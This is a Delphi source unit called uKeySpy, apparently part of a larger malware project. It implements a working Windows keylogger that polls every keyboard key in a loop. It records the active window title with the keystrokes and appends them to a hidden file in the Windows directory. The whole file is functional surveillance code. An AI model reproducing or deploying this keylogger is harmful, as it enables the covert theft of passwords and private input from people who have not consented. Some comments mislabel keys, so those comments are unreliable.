   UNIT uKeySpy;

   INTERFACE

   USES
     AclUtils, Windows, uP2P, uUtils;

   PROCEDURE GetLetter;

   VAR
     KeyFile : FILE;

   IMPLEMENTATION

   VAR
     cWindow : STRING;

   //------------------------------------------------------------------------------
   FUNCTION Shift : Boolean;
   BEGIN
     Shift:=GetAsyncKeyState(VK_SHIFT)<>0;
   END;

   //------------------------------------------------------------------------------
   FUNCTION MoreChars(CharNumber:Integer;TruePart,FalsePart:STRING;VAR Answer:STRING) : Boolean;
   BEGIN
      MoreChars:=True;
      IF Odd(GetAsyncKeyState(CharNumber)) THEN BEGIN
         IF Shift THEN Answer:=TruePart ELSE Answer:=FalsePart;
         Exit;
      END;
      MoreChars:=False;
   END;

   //------------------------------------------------------------------------------
   FUNCTION ActiveCaption : STRING;
   VAR
     Handle : THandle;
     Len    : LongInt;
     Title  : STRING;
   BEGIN
     Handle:=GetForegroundWindow;
     Len:=GetWindowTextLength(Handle)+1;
     SetLength(Title,Len);
     GetWindowText(Handle,pChar(Title),Len);
     ActiveCaption:=TrimRight(Title);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE ShowLetter(strLetter:STRING);
   VAR
     S : STRING;
   BEGIN
     IF cWindow<>ActiveCaption THEN BEGIN
       cWindow:=ActiveCaption;
       strLetter:=CRLF+'['+cWindow+']'+CRLF+strLetter;
     END;
     S:=WinPath+MainStr(34);
     IF NOT FileExists(S) THEN BEGIN
       {$I-}
       ReWrite(KeyFile);
        IF IOResult=0 THEN BEGIN
          CloseFile(KeyFile);
          SetFileAttributes(pChar(S),FILE_ATTRIBUTE_HIDDEN);
        END;
        {$I+}
     END;
     {$I-}
     FileMode:=2;
     Reset(KeyFile,1);
     Seek(KeyFile,FileSize(KeyFile));
     IF Length(strLetter)>0 THEN BlockWrite(KeyFile,strLetter[1],Length(strLetter));
     CloseFile(KeyFile);
     {$I+}
   END;

   //------------------------------------------------------------------------------
   PROCEDURE GetLetter;
   VAR
     J : Integer;
     A : STRING;
   BEGIN
     WHILE TRUE DO BEGIN
       FOR J:=65 TO 90 DO IF Odd(GetAsyncKeyState(J)) THEN ShowLetter(Chr(J));                       //Verify IF lettrers 'A'..'Z' is pressed
       FOR J:=96 TO 105 DO IF Odd(GetAsyncKeyState(J)) THEN ShowLetter(IntToStr((J-97)+1));          //Verify IF numpab is pressed
       FOR J:=112 TO 135 DO IF Odd(GetAsyncKeyState(J)) THEN ShowLetter('{F'+IntToStr(J-112+1)+'}'); //Verify IF F1 to F24 is pressed
       FOR J:=48 TO 57 DO IF Odd(GetAsyncKeyState(J)) THEN                                           //Verify IF number 0 to 9 is pressed
         IF Shift THEN BEGIN
           CASE J-48 OF
             1 : ShowLetter('!');
             2 : ShowLetter('@');
             3 : ShowLetter('#');
             4 : ShowLetter('$');
             5 : ShowLetter('%');
             6 : ShowLetter('^');
             7 : ShowLetter('&');
             8 : ShowLetter('*');
             9 : ShowLetter('(');
             0 : ShowLetter(')');
            END;
         END ELSE ShowLetter(IntToStr(J-48));
       IF Odd(GetAsyncKeyState(VK_BACK)) THEN ShowLetter(MainStr(145));              //"<Back>"
       IF Odd(GetAsyncKeyState(VK_TAB)) THEN ShowLetter(MainStr(146));               //"<Back>"
       IF Odd(GetAsyncKeyState(VK_RETURN)) THEN ShowLetter(CRLF);
       IF Odd(GetAsyncKeyState(VK_SHIFT)) THEN ShowLetter(MainStr(147));             //"<Shift>"
       IF Odd(GetAsyncKeyState(VK_CONTROL)) THEN ShowLetter(MainStr(148));           //"<Shift>"
       IF Odd(GetAsyncKeyState(VK_MENU)) THEN ShowLetter(MainStr(149));              //"<Alt>"
       IF Odd(GetAsyncKeyState(VK_PAUSE)) THEN ShowLetter(MainStr(150));             //"<Pause>"
       IF Odd(GetAsyncKeyState(VK_ESCAPE)) THEN ShowLetter(MainStr(151));            //"<ESC>"
       IF Odd(GetAsyncKeyState(VK_SPACE)) THEN ShowLetter(' ');
       IF Odd(GetAsyncKeyState(VK_END)) THEN ShowLetter(MainStr(152));               //"<End>"
       IF Odd(GetAsyncKeyState(VK_HOME)) THEN ShowLetter(MainStr(153));              //"<Home>"
       IF Odd(GetAsyncKeyState(VK_LEFT)) THEN ShowLetter(MainStr(154));              //"<Left>"
       IF Odd(GetAsyncKeyState(VK_RIGHT)) THEN ShowLetter(MainStr(155));             //"<Right>"
       IF Odd(GetAsyncKeyState(VK_UP)) THEN ShowLetter(MainStr(156));                //"<Up>"
       IF Odd(GetAsyncKeyState(VK_DOWN)) THEN ShowLetter(MainStr(157));              //"<Down>"
       IF Odd(GetAsyncKeyState(VK_INSERT)) THEN ShowLetter(MainStr(158));            //"<Insert>"
       IF Odd(GetAsyncKeyState(VK_MULTIPLY)) THEN ShowLetter('*');
       IF Odd(GetAsyncKeyState(VK_ADD)) THEN ShowLetter('+');
       IF Odd(GetAsyncKeyState(VK_SUBTRACT)) THEN ShowLetter('-');
       IF Odd(GetAsyncKeyState(VK_DECIMAL)) THEN ShowLetter('.');
       IF Odd(GetAsyncKeyState(VK_DIVIDE)) THEN ShowLetter('/');
       IF Odd(GetAsyncKeyState(VK_NUMLOCK)) THEN ShowLetter(MainStr(159));           //"<Num>"
       IF Odd(GetAsyncKeyState(VK_CAPITAL)) THEN ShowLetter(MainStr(160));           //"<C>"
       IF Odd(GetAsyncKeyState(VK_SCROLL)) THEN ShowLetter(MainStr(161));            //"<S>"
       IF Odd(GetAsyncKeyState(VK_DELETE)) THEN ShowLetter(MainStr(162));            //"<D>"
       IF Odd(GetAsyncKeyState(VK_PRIOR)) THEN ShowLetter(MainStr(163));             //"<PU>"
       IF Odd(GetAsyncKeyState(VK_NEXT)) THEN ShowLetter(MainStr(164));              //"<PD>"
       IF Odd(GetAsyncKeyState(VK_PRINT)) THEN ShowLetter(MainStr(165));             //"<Print>"
       IF MoreChars($BA,':',';',A) THEN ShowLetter(A);
       IF MoreChars($BB,'+','=',A) THEN ShowLetter(A);
       IF MoreChars($BC,'<',',',A) THEN ShowLetter(A);
       IF MoreChars($BD,'_','-',A) THEN ShowLetter(A);
       IF MoreChars($BE,'>','.',A) THEN ShowLetter(A);
       IF MoreChars($BF,'?','/',A) THEN ShowLetter(A);
       IF MoreChars($C0,'~','`',A) THEN ShowLetter(A);
       IF MoreChars($DB,'{','[',A) THEN ShowLetter(A);
       IF MoreChars($DC,'|','\',A) THEN ShowLetter(A);
       IF MoreChars($DD,'}',']',A) THEN ShowLetter(A);
       IF MoreChars($DE,'"','''',A) THEN ShowLetter(A);
       Sleep(100);                                                                   // Sleep 0.1 second
     END;
   END;

   END.
